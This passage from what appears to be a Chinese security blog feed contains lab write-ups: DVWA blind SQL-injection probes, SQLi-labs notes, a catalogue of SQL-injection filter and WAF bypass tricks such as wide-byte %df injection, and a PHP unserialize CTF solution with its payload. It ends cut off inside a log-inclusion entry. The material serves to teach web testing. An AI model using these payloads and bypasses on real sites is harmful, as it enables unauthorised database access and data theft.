<th>substr(string, -1,3)：取string右边第1位置起，3字长的字符串。显然右边第一位置起往右不够3字长。</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>结果只能是： g</p>
<table>
<thead>
<tr>
<th>1</th>
<th>substr(string, -3,3)：取string右边第3位置起，3字长的字符串。</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>结果为: ing<br> （3）查找表名（以数据库的第一个表的第一个字母为例）（最终查到的表名：guestbook）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>dvwa<span class="string">&#x27; limit 0,1),1,1)) &gt; 101) #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (select <span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>((select table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;dvwa&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">110</span>) <span class="comment">#</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>dvwa<span class="string">&#x27; limit 0,1),1,1)) &gt; 105) #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (select <span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>((select table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;dvwa&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">103</span>) <span class="comment">#</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>dvwa<span class="string">&#x27; limit 0,1),1,1)) &gt; 102) #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (select <span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>((select table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;dvwa&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) = <span class="number">103</span>) <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>（4）查找表中的第一个字段名（以数据库中第一个表的第一个字段为例）（最终查到的列名：comment_id）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;</span>dvwa<span class="string">&#x27; and table_name=&#x27;</span>guestbook<span class="string">&#x27; limit 0,1),1,1)) &gt; 101) #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (select <span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>((select column_name <span class="keyword">from</span> information_schema.columns where table_schema=<span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">and</span> table_name=<span class="string">&#x27;guestbook&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &lt; <span class="number">101</span>) <span class="comment">#</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;</span>dvwa<span class="string">&#x27; and table_name=&#x27;</span>guestbook<span class="string">&#x27; limit 0,1),1,1)) &lt; 90) #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (select <span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>((select column_name <span class="keyword">from</span> information_schema.columns where table_schema=<span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">and</span> table_name=<span class="string">&#x27;guestbook&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &lt; <span class="number">95</span>) <span class="comment">#</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;</span>dvwa<span class="string">&#x27; and table_name=&#x27;</span>guestbook<span class="string">&#x27; limit 0,1),1,1)) &lt; 98) #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (select <span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>((select column_name <span class="keyword">from</span> information_schema.columns where table_schema=<span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">and</span> table_name=<span class="string">&#x27;guestbook&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &lt; <span class="number">99</span>) <span class="comment">#</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;</span>dvwa<span class="string">&#x27; and table_name=&#x27;</span>guestbook<span class="string">&#x27; limit 0,1),1,1)) &lt; 100) #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (select <span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>((select column_name <span class="keyword">from</span> information_schema.columns where table_schema=<span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">and</span> table_name=<span class="string">&#x27;guestbook&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) = <span class="number">99</span>) <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>（5）查找数据库中第一个表中第一个字段中的第一个数据的第一个字母（最终查到的数据：1）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt; 101) #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (select <span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>((select comment_id <span class="keyword">from</span> guestbook limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">50</span>) <span class="comment">#</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt; 30) #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (select <span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>((select comment_id <span class="keyword">from</span> guestbook limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">40</span>) <span class="comment">#</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt; 45) #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (select <span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>((select comment_id <span class="keyword">from</span> guestbook limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">48</span>) <span class="comment">#</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) = 49) #</span></span><br></pre></td></tr></table></figure></script></p>]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入bypass</title>
    <url>/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/</url>
    <content><![CDATA[<h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><p>[<a href="https://www.cnblogs.com/Vinson404/p/7253255.html#:~:text=SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%201%201.%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%88%E6%B3%A8%E9%87%8A%E7%AC%A6%20%2F%2A%20%2A%2F%EF%BC%8C%25a0%20%EF%BC%89%EF%BC%9A%202%202.%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%9A,xor%20not%E7%BB%95%E8%BF%87%EF%BC%9A%207%207.%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%EF%BC%88%23%EF%BC%8C--%20%28%E5%90%8E%E9%9D%A2%E8%B7%9F%E4%B8%80%E4%B8%AA%E7%A9%BA%E6%A0%BC%EF%BC%89%EF%BC%89%E8%BF%87%E6%BB%A4%EF%BC%9A%208%208.%3D%E7%BB%95%E8%BF%87%EF%BC%9A%20%E6%9B%B4%E5%A4%9A%E9%A1%B9%E7%9B%AE]">https://www.cnblogs.com/Vinson404/p/7253255.html#:~:text=SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%201%201.%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%88%E6%B3%A8%E9%87%8A%E7%AC%A6%20%2F%2A%20%2A%2F%EF%BC%8C%25a0%20%EF%BC%89%EF%BC%9A%202%202.%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%9A,xor%20not%E7%BB%95%E8%BF%87%EF%BC%9A%207%207.%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%EF%BC%88%23%EF%BC%8C--%20%28%E5%90%8E%E9%9D%A2%E8%B7%9F%E4%B8%80%E4%B8%AA%E7%A9%BA%E6%A0%BC%EF%BC%89%EF%BC%89%E8%BF%87%E6%BB%A4%EF%BC%9A%208%208.%3D%E7%BB%95%E8%BF%87%EF%BC%9A%20%E6%9B%B4%E5%A4%9A%E9%A1%B9%E7%9B%AE]</a>(<a href="https://www.cnblogs.com/Vinson404/p/7253255.html#:~:text=SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7">https://www.cnblogs.com/Vinson404/p/7253255.html#:~:text=SQL注入绕过技巧</a> 1 1.绕过空格（注释符 %2F* *%2F，%a0 ）： 2 2.括号绕过空格：,xor not绕过： 7 7.绕过注释符号（%23，– (后面跟一个空格））过滤： 8 8.%3D绕过： 更多项目)</p>
<p><a href="https://blog.csdn.net/Likhaooo/article/details/122746954">https://blog.csdn.net/Likhaooo/article/details/122746954</a></p>
<p><a href="https://blog.csdn.net/huanghelouzi/article/details/82995313">https://blog.csdn.net/huanghelouzi/article/details/82995313</a></p>
<span id="more"></span>

<h3 id="1-双写绕过"><a href="#1-双写绕过" class="headerlink" title="1.双写绕过"></a>1.双写绕过</h3><p>如：union————uunionnion</p>
<h3 id="2-大小写绕过"><a href="#2-大小写绕过" class="headerlink" title="2.大小写绕过"></a>2.大小写绕过</h3><p>如：union————uNion</p>
<h3 id="3-空格绕过"><a href="#3-空格绕过" class="headerlink" title="3.空格绕过"></a>3.空格绕过</h3><p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672904168441-e45d6618-2256-45c6-964d-9947b331e399.png" alt="img"></p>
<p>/**/</p>
<p>两个空格代替一个空格，用 Tab 代替空格，%a0=空格</p>
<p>%20 %09 %0a %0b %0c %0d %a0 </p>
<p>%09 TAB 键（水平）</p>
<p>%0a 新建一行</p>
<p>%0c 新的一页</p>
<p>%0d return 功能</p>
<p>%0b TAB 键（垂直）</p>
<p>%a0 空格</p>
<p>`` 反引号绕过空格 payload：select * from <code>users</code> where user_id=1 limit 0,1;</p>
<p>()   括号绕过空格</p>
<h3 id="4-等号绕过"><a href="#4-等号绕过" class="headerlink" title="4.等号绕过"></a>4.等号绕过</h3><p>like代替=</p>
<p>&lt;&gt;等价于!=所以我们可以在&lt;&gt;前加个!就变成等于了。</p>
<p>例如:id=-1’ union select * from users where ! (id&lt;&gt;2)%23</p>
<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672835713783-67483261-f53f-4b24-b0ef-d5f06dcbe2c8.png" alt="img"></p>
<h3 id="5-宽字节注入"><a href="#5-宽字节注入" class="headerlink" title="5.宽字节注入"></a>5.宽字节注入</h3><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 &#39; 。</p>
<p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字：</p>
<p>%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p>
<p>id=-1%df%27union select 1,user(),3–+</p>
<p>%df  %de %e0 %e1等字符可以与%5c（’&#39;）结合成为一个字符</p>
<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672835895484-1baff8b5-acd7-4fa8-9e3e-8db4747171ad.png" alt="img"></p>
<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672904257358-2d8b9a5d-ac71-4166-9135-910dc22223b5.png" alt="img"></p>
<h3 id="安全狗绕过测试"><a href="#安全狗绕过测试" class="headerlink" title="安全狗绕过测试"></a>安全狗绕过测试</h3><p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672905525941-6132af97-256e-4ac2-b0d0-babb9a5a02ce.png" alt="img"></p>
<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672905052047-8f2b1c70-325a-48fe-862e-606f13468785.png" alt="img"></p>
<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672905204938-08064d9a-ed11-46b4-ac0b-8c4754cebff7.png" alt="img"></p>
<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672905348334-c2fd2c55-5508-4ca8-a2ed-5fc405637de7.png" alt="img"></p>
<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672905381143-bac0ab1c-e501-4c60-a394-5640cc15971c.png" alt="img"></p>
<p><img src="/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/1672905451016-7bd3b8b2-2b7f-46be-834b-3c2f35e51ea4.png" alt="img"></p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>(SWPUCTF 2021 新生赛)ez_unserialize</title>
    <url>/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/</url>
    <content><![CDATA[<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671070605858-43f3f5c2-fbff-4677-90ac-0fe0d7781677.png" alt="img"></p>
<span id="more"></span>

<p>常规来看，找不到题目，找源码。</p>
<p>源码不给提示。扫目录</p>
<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671070663737-8aabd0ac-c2ed-4735-93b2-4c0f52442e27.png" alt="img"></p>
<p>robots.txt里面有不能访问的文件名</p>
<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671070709712-b23888e2-cc78-4328-9689-dd290d1caed2.png" alt="img"></p>
<p>代码分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;cl45s.php&quot;);</span><br><span class="line"></span><br><span class="line">class wllm&#123;                              //定义了一个wllm类</span><br><span class="line"></span><br><span class="line">    public $admin;                       //定义类属性admin</span><br><span class="line">    public $passwd;                      //定义类属性passwd</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;       //魔法方法中的__construct方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称</span><br><span class="line">        $this-&gt;admin =&quot;user&quot;;            //定义wllm类中的admin属性值为user</span><br><span class="line">        $this-&gt;passwd = &quot;123456&quot;;        //定义wllm类中的passwd属性值为123456</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;     //魔法方法————dustruct，析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法</span><br><span class="line">        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123;  //当admin=admin，passwd=ctf时输出flag</span><br><span class="line">            include(&quot;flag.php&quot;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;                            //反之，输出admin、passwd以及just a bit more</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &quot;Just a bit more!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$p = $_GET[&#x27;p&#x27;];                           //用get方法接收参数p</span><br><span class="line">unserialize($p);                           //将参数p反序列化</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>所以解题的关键在于将p参数反序列化的内容序列化，一负一正得出flag</p>
<p>所以构造序列化代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class wllm&#123;</span><br><span class="line"></span><br><span class="line">    public $admin;</span><br><span class="line">    public $passwd;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">        $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123;</span><br><span class="line">            include(&quot;flag.php&quot;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &quot;Just a bit more!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$aa=new wllm();             //aa为wllm的实例化对象</span><br><span class="line">$aa-&gt;admin=&quot;admin&quot;;         //aa的admin属性值为admin</span><br><span class="line">$aa-&gt;passwd=&quot;ctf&quot;;          //aa的passwd属性值为ctf</span><br><span class="line">$s=serialize($aa);          //将aa序列化赋值给s</span><br><span class="line">print_r($s);                //输出s</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671071554143-e61d21a7-14b5-4ab2-85e6-569c66349c5f.png" alt="img"></p>
<p>payload</p>
<p>?p=O:4:”wllm”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:3:”ctf”;}</p>
<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671071604351-3ab66640-83a3-47fa-865a-52fdc266fd8a.png" alt="img"></p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlilab靶场</title>
    <url>/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/</url>
    <content><![CDATA[<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670049371192-6ee85b0d-6b59-4ea3-9107-3c429c0fe92c.png" alt="img"></p>
<span id="more"></span>

<h3 id="Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入"><a href="#Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入" class="headerlink" title="Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)"></a>Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)</h3><p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670049620796-0c0add00-ddd5-45e2-8dcd-1c9641b53750.png" alt="img"></p>
<p>?id=1’    报错  </p>
<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670049675284-2b4ea92c-e54a-4889-ab02-bdffea0de47d.png" alt="img"></p>
<p>加了注释符之后不报错，说明是字符型注入</p>
<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670049729086-d7787685-39b1-4dc9-8ff6-39723195a924.png" alt="img"></p>
<p>order by 猜字段</p>
<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670049789991-89b569c6-8529-425e-82dd-e0ca640ec250.png" alt="img"></p>
<p>union select 爆出错误所在位置</p>
<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670049861866-cc2d9ab8-3a5f-487f-9d30-f67157882aef.png" alt="img"></p>
<p>查看数据库和版本信息</p>
<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670049969075-8d212a9d-ad4f-479d-8cdf-45f94f024175.png" alt="img"></p>
<p>爆表名</p>
<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670050221439-05f64900-187c-4cf3-b513-a995209eeaf8.png" alt="img"></p>
<p>爆列名</p>
<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670050905009-87111a35-1ac5-4c9e-87fa-9a4cd7d466c0.png" alt="img"></p>
<p>爆数据</p>
<p>0x3a： 0x是十六进制标志，3a是十进制的58，是ascii中的 ‘:’ ，用以分割pasword和username。</p>
<h3 id="Less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入"><a href="#Less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入" class="headerlink" title="Less-2 GET - Error based - Intiger based (基于错误的GET整型注入)"></a>Less-2 GET - Error based - Intiger based (基于错误的GET整型注入)</h3><p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670070233672-120a1495-bf5e-4bed-ae81-ee1eebb6ee0b.png" alt="img"></p>
<p>id=1 and 1=1 不报错，可知整形注入</p>
<p>其余步骤与第一关一样，不加’与注释符号</p>
<h3 id="Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入" class="headerlink" title="Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)"></a>Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</h3><p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670070788475-ba305d81-a326-4993-a092-268b2ae50601.png" alt="img"></p>
<p>报错数字1的后面多了），可疑</p>
<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670070854475-317596fe-0224-4f50-83a0-3a0bc4554087.png" alt="img"></p>
<p>所以是‘）绕过</p>
<p>后续步骤与第一关一样</p>
<h3 id="Less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）"><a href="#Less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）" class="headerlink" title="Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）"></a>Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</h3><p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670071003645-fd581b22-0a46-44af-8fa4-7690181e23fc.png" alt="img"></p>
<p>这都不报错，有点顽固</p>
<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670073776067-f4c2622c-3701-4210-8a6b-f9ce6ff0995a.png" alt="img"></p>
<p>看到一个），可疑</p>
<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670073797643-e6506375-d53b-433d-9292-b8ae1ea98849.png" alt="img"></p>
<p>其余步骤和第一关一样</p>
<h3 id="对前四关总结"><a href="#对前四关总结" class="headerlink" title="对前四关总结"></a>对前四关总结</h3><p>前四关都是再id=1的基础上加一个或两个符号，可以根据报错来判断需要用什么符号来绕过。</p>
<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670074546797-aba5906a-1ee3-4127-a7f2-b50a91da31ba.png" alt="img">以此为例，报错语句中   ‘’1’’)LIMIT0,1’     </p>
<p>简要分析，除掉两端的单引号 则为 ‘1’’)LIMIT0,1 ，可以看出1的右边多了’)，我们输入的为?id=1’</p>
<p>所以可以分解为   ‘1’    ‘)    LIMIT0,1    ,中间的‘是sql语句中本身就带着的，被我们前面加上的’给挤到后面了，所以sql中还多了一个），这一个）就是为了闭合（</p>
<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670074970572-d6471fcf-929d-4986-9a7a-4eaf3d4a646b.png" alt="img"></p>
<p>1为我们加的闭合字符，2为sql语句中的原有字符</p>
<p>所以判断为’)闭合</p>
<h3 id="Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入"><a href="#Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入" class="headerlink" title="Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)"></a>Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)</h3><h3 id="sql盲注知识点"><a href="#sql盲注知识点" class="headerlink" title="sql盲注知识点"></a>sql盲注知识点</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">left(database(),1)&gt;’s’        //left()函数</span><br></pre></td></tr></table></figure>

<p>Explain:database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>((select table_name information_schema.tables where tables_schema=<span class="title function_ invoke__">database</span>()limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span> --+</span><br></pre></td></tr></table></figure>

<p>//substr()函数，ascii()函数</p>
<p>Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换</p>
<p>为 ascii 值</p>
<p>▲ascii(substr((select database()),1,1))=98</p>
<p>▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER</p>
<p>BY id LIMIT 0,1),1,1))&gt;98%23</p>
<p>//ORD()函数，MID()函数</p>
<p>Explain：mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位</p>
<p>Ord()函数同 ascii()，将字符转为 ascii 值</p>
<p>left(version(),1)=5  查看version()第一位是不是5</p>
<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670075852822-badc8924-cffa-46c1-a0f1-b932e3d9238d.png" alt="img"></p>
<p>length(database())=8 查看database()是否为8位</p>
<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670075936145-605ace9e-1831-4ecf-b81f-0be9826c542d.png" alt="img"></p>
<p> left(database(),8)=’security’ 查看数据库是否为security</p>
<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670076538200-5e118c45-dd13-417f-ab6a-ad3e1f78956f.png" alt="img"></p>
<p>ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101</p>
<p>此处 table_schema 可以写成 =’security’，但是我们这里使用的 database()，是因为此处 database()就是 security。此处同样的使用二分法进行测试，直到测试正确为止。此处应该是 101，因为第一个表示 email。</p>
<p>substr(a,b,c)从b位置开始，截取a的c位</p>
<p>limit 0,1表示的是从第一条记录开始，只取一条即可</p>
<p>limit 5,10表示的是从第五条记录开始，取十条记录，取到第16条记录</p>
<p><img src="/2023/01/07/Sqlilab%E9%9D%B6%E5%9C%BA/1670076947845-a854c8e2-b57f-495f-989e-f3388fb9136a.png" alt="img"></p>
<p>第五关第六关操作差不多</p>
<p>剩下的不写了，都差不多</p>
<p><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024">https://blog.csdn.net/hxhxhxhxx/article/details/107643024</a></p>
<p><a href="https://www.cnblogs.com/-qing-/p/11610385.html#_label0">https://www.cnblogs.com/-qing-/p/11610385.html#_label0</a></p>
]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>(UA头文件包含)ctfshow 80 日志文件包含</title>
    <url>/2023/01/07/UA%E5%A4%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-ctfshow-80-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">\# -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Last</span> Modified time: 2020-09-16 11:26:29</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span 